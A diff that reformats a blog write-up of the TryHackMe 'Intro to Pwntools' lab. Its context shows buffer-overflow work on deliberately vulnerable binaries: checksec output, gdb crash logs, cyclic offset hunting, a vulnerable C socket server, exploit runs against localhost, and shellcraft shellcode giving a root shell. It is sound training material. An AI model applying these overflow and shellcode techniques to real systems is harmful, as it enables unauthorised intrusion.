@@ -6,16 +6,16 @@ categories:
   - TryHackMe
 ---
 
-<img src="pwntools.png" alt="pwntools" width=200/>
+{{< post-img src="pwntools.png" alt="pwntools" style="width: 200px;" >}}
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools$ cat note.txt
 
 
 Dear buzz,
 Welcome to Intro to Pwntools!
 In this folder, you will find
-a wonderful adventure of 
+a wonderful adventure of
 binary exploitation!
 
 Sincerely,
@@ -23,7 +23,7 @@ dizmas
 ```
 ## Checksec
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn1
 [*] '/home/buzz/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1'
     Arch:     i386-32-little
@@ -41,7 +41,7 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ checksec intro2pwn2
     RWX:      Has RWX segments
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/checksec$ ./intro2pwn1
 Please input your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
@@ -50,7 +50,7 @@ Aborted (core dumped)
 ```
 ## Cyclic
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls -al
 total 32
 drwxrwxr-x 2 buzz   buzz   4096 Jun 10 02:23 .
@@ -87,7 +87,7 @@ int main(){
 }
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ checksec intro2pwn3
 [*] '/home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3'
     Arch:     i386-32-little
@@ -98,8 +98,8 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ checksec intro2pwn3
 ```
 
 
-```
-buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3     
+```bash
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3
 GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
 Copyright (C) 2018 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -166,9 +166,9 @@ Invalid address 0x4a4a4a4a
    f 7 0x51515151
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ cyclic 100 > pattern
-buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3      
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb intro2pwn3
 GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
 Copyright (C) 2018 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -235,11 +235,11 @@ Invalid address 0x6161616a
    f 7 0x61616171
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
 alphabet  flag.txt  intro2pwn3  pattern  test_cyclic.c
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ touch pwn_cyclic.py
-buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ nano pwn_cyclic.py 
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ nano pwn_cyclic.py
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
 alphabet  attack  flag.txt  intro2pwn3  pattern  pwn_cyclic.py  test_cyclic.c
@@ -325,12 +325,12 @@ Invalid address 0xdeadbeef
  ► f 0 0xdeadbeef
 ```
 
-```
+```bash
 pwndbg> print& print_flag
 $1 = (<text variable, no debug info> *) 0x8048536 <print_flag>
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic.py > attack
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/cyclic$ ls
 alphabet  attack  flag.txt  intro2pwn3  pattern  pwn_cyclic.py  test_cyclic.c
@@ -342,19 +342,19 @@ flag{cyclic_flag}
 
 ## Networking
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat note_to_buzz.txt
 Dear buzz,
 
 I'm running a service on port 1337, which has an overflow vulnerability.
 I've left you a version that will run on port 1336 so that you can develop
-your exploit. 
+your exploit.
 
 Sincerely,
 dizmas
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ checksec serve_test
 [*] '/home/buzz/IntroToPwntools/IntroToPwntools/networking/serve_test'
     Arch:     i386-32-little
@@ -364,7 +364,7 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ checksec serve_test
     PIE:      PIE enabled
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat test_networking.c
 //Networking C code from:
 // https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
@@ -379,7 +379,7 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ cat test_networking
 #define MAX 32
 #define PORT 1336
 #define SA struct sockaddr
-  
+
 // function which handles input and output over the socket
 void target_function(int sockfd)
 {
@@ -391,16 +391,16 @@ void target_function(int sockfd)
 
     for (;;) {
         bzero(targets.buff, MAX);
-  
+
         write(sockfd, "Give me deadbeef: ", 18);
 
         targets.printflag = 0;
         read(sockfd, targets.buff, 100);
-        
+
         printf("From client: %s\t ", targets.buff);
         bzero(targets.buff, MAX);
-  
-  
+
+
         if (targets.printflag == 0xdeadbeef) {
             write(sockfd, "Thank you!\nflag{*****************}", 34);
             break;
@@ -411,14 +411,14 @@ void target_function(int sockfd)
         }
     }
 }
-  
+
 
 int main()
 {
     int sockfd, connfd, len;
     struct sockaddr_in servaddr, cli;
-  
-    
+
+
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd == -1) {
         printf("socket creation failed...\n");
@@ -427,12 +427,12 @@ int main()
     else
         printf("Socket successfully created..\n");
     bzero(&servaddr, sizeof(servaddr));
-  
+
     // assign IP, PORT
     servaddr.sin_family = AF_INET;
     servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
     servaddr.sin_port = htons(PORT);
-  
+
     // Binding newly created socket to given IP and verification
     if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
         printf("socket bind failed...\n");
@@ -440,7 +440,7 @@ int main()
     }
     else
         printf("Socket successfully binded..\n");
-  
+
     // Now server is ready to listen and verification
     if ((listen(sockfd, 5)) != 0) {
         printf("Listen failed...\n");
@@ -449,7 +449,7 @@ int main()
     else
         printf("Server listening..\n");
     len = sizeof(cli);
-  
+
     // Accept the data packet from client and verification
     connfd = accept(sockfd, (SA*)&cli, &len);
     if (connfd < 0) {
@@ -458,41 +458,41 @@ int main()
     }
     else
         printf("server acccept the client...\n");
-  
+
     // target function handles input and output
     target_function(connfd);
-  
+
     // After chatting close the socket
     close(sockfd);
 }
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ ./serve_test
 Socket successfully created..
 Socket successfully binded..
 Server listening..
 server acccept the client...
-From client: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ� 
+From client: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ touch exploit.py
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ nano exploit.py
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python exploit.py
 [+] Opening connection to 127.0.0.1 on port 1336: Done
-Give me deadbeef: 
+Give me deadbeef:
 Thank you!
 flag{*****************}
 [*] Closed connection to 127.0.0.1 port 1336
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ touch expoit.py
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ nano expoit.py
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/networking$ python expoit.py
 [+] Opening connection to 127.0.0.1 on port 1337: Done
-Give me deadbeef: 
+Give me deadbeef:
 Thank you!
 flag{networking_flag}
 [*] Closed connection to 127.0.0.1 port 1337
@@ -500,12 +500,12 @@ flag{networking_flag}
 
 ## Shellcraft
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat note_to_buzz_2.txt
 Dear buzz,
 
 For this last pwntools challenge, you will need to disable ASLR.
-I have provided a script for you to do so, which you can run as 
+I have provided a script for you to do so, which you can run as
 sudo without a password. Just run:
 
 sudo ./disable_aslr.sh
@@ -517,12 +517,12 @@ Sincerely,
 dizmas
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ sudo ./disable_aslr.sh
 0
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls -al
 total 32
 drwxrwxr-x 2 buzz   buzz   4096 Jun 10 02:18 .
@@ -534,7 +534,7 @@ drwxrwxr-x 6 buzz   buzz   4096 May 19  2021 ..
 -rw-rw-r-- 1 buzz   buzz    191 Jun  9 21:37 test_shellcraft.c
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat test_shellcraft.c
 #include <stdio.h>
 #include <stdlib.h>
@@ -554,7 +554,7 @@ int main(){
 }
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ checksec intro2pwnFinal
 [*] '/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
     Arch:     i386-32-little
@@ -565,9 +565,9 @@ buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ checksec intro2pwnF
     RWX:      Has RWX segments
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ cyclic 100 > pattern
-buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb intro2pwnFinal  
+buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb intro2pwnFinal
 GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
 Copyright (C) 2018 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -632,14 +632,14 @@ Invalid address 0x61616174
    f 5 0x61616179
 ```
 
-```
+```bash
 buzz@intro2pwn:~/IntroToPwntools/IntroToPwntools/shellcraft$ python exploit.py
 [+] Starting local process './intro2pwnFinal': pid 1310
 [*] Switching to interactive mode
 ```
 
 
-```
+```bash
 $ shellcraft i386.linux.sh -f a
 Warning: error: setupterm: could not find terminfo database
 
@@ -668,18 +668,15 @@ Terminal features will not be available.  Consider setting TERM variable to your
     int 0x80
 ```
 
-```
+```bash
 $ whoami
 root
 ```
 
-```
+```bash
 $ cd /root
 $ ls
 flag.txt
 $ cat flag.txt
 flag{shellcraft_flag}
 ```
-
-
-
